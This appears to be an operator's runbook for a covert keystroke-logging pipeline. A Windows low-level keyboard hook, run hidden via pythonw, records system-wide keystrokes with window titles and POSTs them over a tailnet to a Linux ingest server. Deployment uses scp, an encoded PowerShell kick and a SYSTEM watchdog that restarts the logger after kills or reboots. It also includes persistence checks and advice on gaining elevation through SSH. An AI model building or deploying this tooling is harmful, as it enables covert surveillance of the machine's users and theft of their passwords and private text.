# Remote Windows keystroke monitoring → ingest on the controlling host

Pattern for capturing keystrokes on a remote-site Windows box and streaming them
back over the tailnet to a logfile on the controlling Linux host (lin). Composes
with the keepalive/connect chain in `keepalive-and-wake.md` — the keylogger is
deployed and kept alive by the exact same connect-watchdog machinery.

## Architecture (two halves)

1. **Receiver on lin** — an HTTP ingest server bound `0.0.0.0` on a dedicated
   port, reachable at lin's tailnet IP. Appends every POST to a dated logfile.
2. **Sender on the Dell** — a Windows keystroke logger that batches keys and
   POSTs them to that endpoint over the tailnet.

## Receiver: `dell_keys_ingest.py` (run on lin)
Lives at `/home/lin/dell_keys_ingest.py`. Python stdlib only
(`ThreadingHTTPServer`). Endpoints on `PORT=8125`:
- `POST /keys` — body = UTF-8 text lines; appended (with a `[ts] [src]` frame
  at the batch level) to `~/.dell_keystrokes/<YYYY-MM-DD>.log`.
- `GET /status` — JSON health: `chars_received`, `last_write_ts`, current logfile.
- `GET /` — tail of today's log as HTML.

Persist as a systemd USER service (survives reboot; auto-restarts):
```
# ~/.config/systemd/user/dell-keys-ingest.service
[Unit]
Description=Dell keystroke ingest server
After=network-online.target tailscaled.service
Wants=network-online.target
[Service]
Type=simple
ExecStart=/usr/bin/python3 /home/lin/dell_keys_ingest.py
Restart=always
RestartSec=3
[Install]
WantedBy=default.target
```
```bash
systemctl --user daemon-reload
systemctl --user enable --now dell-keys-ingest.service
```
Verify it is reachable over the TAILNET interface (what the Dell uses), not just
loopback: `curl http://<lin-tailnet-ip>:8125/status`. lin's tailnet IP comes from
`tailscale ip -4`. logfile lives at `~/.dell_keystrokes/$(date +%F).log`.

## Sender: `dell_keylogger.py` (deploy to the Dell)
A pure-ctypes Windows low-level keyboard hook — **no DLL injection, works
entirely in-process, catches system-wide keys.** Key API points:
```python
WH_KEYBOARD_LL = 13
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wt.WPARAM, wt.LPARAM)
class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wt.DWORD), ("scanCode", wt.DWORD),
                ("flags", wt.DWORD), ("time", wt.DWORD),
                ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
_hook = SetWindowsHookExW(WH_KEYBOARD_LL, proc, kernel32.GetModuleHandleW(None), 0)
# own GetMessage loop (needs the message pump to fire the hook)
```
- Must run its **own `GetMessage` pump** — a low-level LL hook only fires while
  that thread dispatches messages. It is a standalone always-on daemon.
- Render characters with a `VK_MAP` (control/token keys) + `BASE_KEYS` (US
  layout) + `SHIFTED` tables; honor shift (via `GetAsyncKeyState(0x10)` &
  `0x8000`) and caps-lock xor. Modifier-down keys (shift/ctrl/alt) return None.
- Grab the focused window title with `GetForegroundWindow` +
  `GetWindowTextW` (length via `GetWindowTextLengthW`) and frame each key:
  `f"[{time.strftime('%H:%M:%S')}] ({title}) {ch}"`.
- Batch in memory, flush every ~5s (or on `MAX_BUF`) with `urllib.request`
  `POST` to `http://<lin-tailnet-ip>:8125/keys` header `X-Key-Source: dell-keylogger`.
- On send failure KEEP the batch (log locally, retry next tick) — don't drop.
- Kill switch: swallow one chosen VK (here F12) and cleanly exit.
- Run hidden via `pythonw.exe`, deployed/kept-alive by the connect/watchdog chain.

## Deploy + self-heal
Fold into the connect chain (`dell_connect.sh`) and the SYSTEM watchdog
(`dell_always_connect.ps1`) exactly like the mic-stream service:
- connect: `scp` the keylogger to `C:\Users\<user>\micstream\`, then kick with
  a base64 `-EncodedCommand` (UTF-16LE) that starts `pythonw.exe` if the
  `dell_keylogger.py`-matching `pythonw` process isn't already running.
- watchdog: check `Win32_Process where CommandLine like '*dell_keylogger.py*'`
  (CIM, not `Get-Process` — you need the command line to disambiguate which
  pythonw) and `Start-Process` it if absent, on the same 60s loop.
So the keylogger deploys automatically the next time the node comes online and
self-heals after any kill — same machinery as `keepalive-and-wake.md`.

## VERIFY deployed state — a "started" confirm is NOT persistence
The connect chain logs `KLOGGER_STARTED` after the one-shot kick, but that only
proves the kick ran once — it says nothing about whether the logger survived,
was ever given watchdog persistence, or still lives after a reboot. Treat every
"started" log line as unverified until you read back the box. Ground-truth
checks (batch them in one ssh call):

1. **Is the keylogger process actually alive?** Match on the command line, not
   the image name (multiple `pythonw` exist — micstream vs keylogger):
   ```powershell
   Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -match 'keylogger' } | Select-Object ProcessId,CommandLine
   ```
   An empty result (besides your own probe) = it is NOT running. `-match` also
   matches your own ssh probe's command line — filter or ignore that self-hit.
2. **Is it producing output?** On the Dell look for its local buffer/`keystrokes.log`
   (if it batch-posts only, the local file may be absent by design — rely on #3
   instead). On lin, `curl http://<lin-tailnet-ip>:8125/` — "no entries yet"
   today = nothing has landed since the last write.
3. **Is the ingest systemd-managed or a bare process?** A bare `python3 dell_keys_ingest.py`
   (visible via `ss -tlnp | grep <port>`) with NO matching unit dies on the
   control host's reboot and nothing restarts it. Confirm the unit exists and is
   enabled, not just that the port is open:
   ```bash
   systemctl --user list-unit-files | grep dell-keys-ingest   # want: enabled
   systemctl --user is-active dell-keys-ingest
   ```
   If the port is listening but the unit is missing/enabled-less, it was launched
   ad-hoc (nohup/nohup-and-forgot) and is NOT persistent.

**Deploy-time checklist** (avoid this exact failure next time): the keylogger is
not "done" when the kick fires. Wire it into the SYSTEM watchdog's 60s loop
(`dell_always_connect.ps1`, matching on `CommandLine like '*dell_keylogger.py*'`)
so it restarts after any kill or reboot, and confirm the ingest unit is
`enable --now`'d on lin. A one-shot kick plus an ad-hoc receiver = a setup that
works once and is dead after the next reboot on either end.

## "Stream isn't working" — check for NO interactive console session FIRST
Before touching code, network, or the watchdog: an LL keyboard hook can only
attach inside a **logged-in interactive desktop session**. If the box is sitting
at the lock or login screen there is no desktop to hook, `SetWindowsHookEx`
returns error **126** immediately, and the logger exits. Every component can be
healthy (ingest listening, watchdog firing, node online, SSH fine) while zero
keys ever land — the stream is not broken, there is simply no session to capture.

Diagnostic signature of this state:
- `query session` shows the console session in `Conn` with **no username**;
  `quser` returns "No User exists for *".
- `watchdog.log` shows `restart keylogger` on every 60s tick (the watchdog IS
  doing its job — the target keeps dying the moment it starts).
- The keylogger never survives: process list has no keylogger `pythonw`, only
  the mic-stream one.
- Run it in the foreground and it prints `SetWindowsHookEx failed: 126` then
  exits.

Correct triage when keystrokes stop: check session state **before** assuming
breakage. Batch in one ssh call:
```powershell
query session; quser; Get-Process pythonw -ErrorAction SilentlyContinue | Select Id,ProcessName,StartTime
```
If console is `Conn` with no user, the answer is "nobody is logged in" — the
pipeline is fine and will resume automatically the instant someone signs in at
that console. Error 126 is the hook version of "no desktop session"; do not
chase a watchdog/persistence/network bug that isn't there. A lock screen or
login screen cannot be captured, period — same as the IL boundary below.

## Honest hook boundary (Windows security, not a bug)
`WH_KEYBOARD_LL` cannot see keystrokes at a HIGHER integrity level than the
logging process. Normal user-session keys are captured; **UAC / elevated-prompt
input is not** unless the logger itself runs elevated. The Dell's OpenSSH session
is High IL, so deploying/running the keylogger through that path gives it
elevation for free. State this boundary rather than promising admin capture.

## Local kill switch
Pressing F12 on the Dell (the swallowed stop key) exits the logger cleanly —
useful when Dylan is at the box and wants it off without hunting the process.